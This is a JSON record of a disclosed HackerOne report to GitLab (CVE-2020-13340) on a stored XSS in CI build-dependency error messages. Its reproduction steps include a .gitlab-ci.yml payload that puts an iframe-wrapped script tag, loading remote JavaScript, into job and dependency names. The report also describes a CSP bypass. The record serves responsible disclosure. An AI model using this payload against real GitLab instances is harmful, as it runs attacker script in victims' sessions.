@@ -1,0 +1,216 @@
+{
+  "id": 950190,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTA=",
+  "url": "https://hackerone.com/reports/950190",
+  "title": "Store-XSS in error message of build-dependencies ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-03T13:15:26.987Z",
+  "submitted_at": "2020-08-03T13:15:27.182Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yvvdwf",
+    "url": "/yvvdwf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-13340"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-12-01T08:04:06.926Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-12-01T08:04:06.860Z",
+  "team_member_agreed_on_going_public_at": "2020-11-30T23:22:00.345Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nA stored-XSS is existing in error message of build-dependencies. Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com [disables](https://gitlab.com/gitlab-org/gitlab/-/issues/6144#note_232311971) the dependencies validation. However this feature is enable by default in self-managed installation.\n\n### Steps to reproduce\n\nThe following steps should to be reproduced in a self-managed installation of gitlab\n\n1. Create an empty project\n2. Go to \"Settings/CI/CD/Runners\" to setup a runner for this project\n3. Create new file `.gitlab-ci.yml` for this project using the following content:\n\n```yaml\ntest<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:\n  stage: build\n  script: \n    - date > index.html\n  artifacts:\n    paths: \n      - index.html\n    expire_in: 1 second\n\njob-test:\n  stage: test\n  script: echo \"hi\"\n  dependencies: [\"test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>\"]\n```\n\n4. Wait for the jobs terminated, go to the detail of `job-test`\n5. You should see an alert that contains the current url\n\n### Impact\n\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. \nFurthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.\n\n### What is the current *bug* behavior?\n\nThe `failure_message` has been considered as [safe](https://gitlab.com/gitlab-org/gitlab/-/blob/2a5ebef661656937f823736f4f84400a8979b576/app/serializers/build_details_entity.rb#L135)\n\n### What is the expected *correct* behavior?\n\nThe `failure_message` should be sanitized.\n\n### Relevant logs and/or screenshots\n\nPlease see a screenshot in attached file\n\n### Output of checks\n\n#### Results of GitLab environment info\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n```\nSystem information\nSystem:\t\tUbuntu 18.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.6p146\nGem Version:\t2.7.10\nBundler Version:1.17.3\nRake Version:\t12.3.3\nRedis Version:\t5.0.9\nGit Version:\t2.27.0\nSidekiq Version:5.2.9\nGo Version:\tunknown\n\nGitLab information\nVersion:\t13.2.2-ee\nRevision:\t618883a1f9d\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t11.7\nURL:\t\thttp://gl.local\nHTTP Clone URL:\thttp://gl.local/some-group/some-project.git\nSSH Clone URL:\tgit@gl.local:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t13.3.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. \nFurthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 934607,
+      "file_name": "Screenshot_2020-08-03_at_14.50.32.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ts6SDeb8WLD5E5t8rC6amdda?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-08-03_at_14.50.32.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-08-03_at_14.50.32.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWT3EMSAE%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045251Z&X-Amz-Expires=360&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCl4yjmby3PymTMtE9nJExAhoZ%2B8wXWZ9GjyiJtYrDB8wIgbfYMN%2BrPh5DxboB6W9zNvqpkMOP2EryCQ93e950SCZUqsgUIeBADGgwwMTM2MTkyNzQ4NDkiDE0Wqm3HbLhbntRyziqPBVeVphxft2ZppJAeUox7zh8vCEZcemP4LUTUoUTiast2rsAHmJ5CS%2BWHieiZMN%2B%2B%2BJndJKlkmqiq1f1aNQrr7Luu1ESO2PZRq4p6MWa2INDAjI1m2JlyytQSemfZQJWrG8cjLg8qPMzjiOP6JOl1Y5oUEHloMRcJR5DphGTLk0%2F0rPSOA9lwn%2B6dSXDjzcWWK7P8svt6KhaD1GNmDoAi5L79LM%2F9piClt591gyEjMZTYyLWMS%2BArhqjbXzdIYGxxfXk9GwRikbeDjpgLj3OpD8tDUh%2FVxs7CXOVi0kFEYN7U%2B7Qev%2FUxfHe0jdoJB3EVr7ZVwwge9ur0w7Cdxe5%2FyBveIdKs59VmH4Ll4neiOWu6nqBjLtSSuZi2dVhoTaJQqfSrOOD14a7NnLubR%2BMJIKuPKiObBkc0%2FN3joY4WQf6p9lHXzn9sWF6aeF1WUrOL%2BHkpbZCHvp1F8l5sFXXfZ%2FT6SKDsEk%2BRALnZ%2BhtvpAyRB6DGTpn8Ge3XYJC2bREpC5QhDHQtjlhxGnHR6FguHDlP9jo4sa11h8%2FDaItEUWBuv7SBLDH38bBvpH5UBQI%2B00YSL7deniW7EB5pXZT5d2%2Fp2o6rXAJ5sTcvnAedKan2TICILprSeDlvNfKW%2FZaNZicMPYFMkAzaGlv2rLCsKX%2BINhdsgfPk7gtaXbRRZWfeQE1Xw3ThcA3pDygdwPoIexCFUBNFygaS2Ij1HuEfW77y5%2FQpTCncRbfC3EyS1JNsUU0UBw5%2ByAFrHz3r7mHhkdCQTBKwdIYq8uNqKKZzJU6N7MCfuRz6a%2B6qVsRDuyu4OPL2KYOSNJBy7QxvslmY8zB7v9fpAQF1q4rGhA7kRcUVHaVnwbnMfKEK3EA2tsMwiIm20gY6sQEluz59HJu0bqhLgnq506DplaZcmTkaf8ya5f0Ywh5rPABf1UTfr9J9Oab3Ptj71NPwtV99oJgIYWFSzsMTKyhxoGWkGRhoTXpRc9Iyq%2FGKq7o5JR3fffVru3os%2FLEBvun5bViSRAvxvHQQkovrmRK6ylAijwmD4B8joignqQ5Jk0hLsrA9ZZEPE2AUJ7EvicH9pI7qVM27aVh5CQhTUR%2FlwnYzTLL8l8f3QSgPyR7EorY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=851fd2630c0d2340aeafac794bd64a56f932b2ebdef9d2b9757fa61370ac847a",
+      "file_size": 962203,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 35,
+  "voters": [
+    "alpharingo",
+    "n1m0",
+    "sw33tlie",
+    "ali",
+    "bibekshah",
+    "tess",
+    "aryan2808",
+    "mik317",
+    "zeroxyele",
+    "0xelkomy",
+    "and 25 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 39022,
+    "asset_type": "OTHER",
+    "asset_identifier": "Your Own GitLab Instance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "950190",
+  "votes": 35,
+  "latest_disclosable_activity_at": "2020-12-01T08:04:06.955Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T12:52:51.580382",
+    "source": "https://hackerone.com/reports/950190.json",
+    "report_id": 950190
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTA=",
+    "databaseId": "950190",
+    "title": "Store-XSS in error message of build-dependencies ",
+    "url": "https://hackerone.com/reports/950190",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-12-01T08:04:06.926Z",
+    "created_at": "2020-08-03T13:15:26.987Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYy",
+      "name": "Cross-site Scripting (XSS) - Stored",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "yvvdwf"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yMzY0NDI=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-08-04T11:04:07.838Z"
+          }
+        },
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yNTYzMzI=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-11-02T20:51:46.619Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzk1MDE5MA==",
+    "_id": "950190",
+    "disclosed": true,
+    "votes": 35,
+    "latest_disclosable_activity_at": "2020-12-01T08:04:06.955Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTA=",
+      "databaseId": "950190",
+      "title": "Store-XSS in error message of build-dependencies ",
+      "url": "https://hackerone.com/reports/950190",
+      "disclosed_at": "2020-12-01T08:04:06.926Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    }
+  }
+}
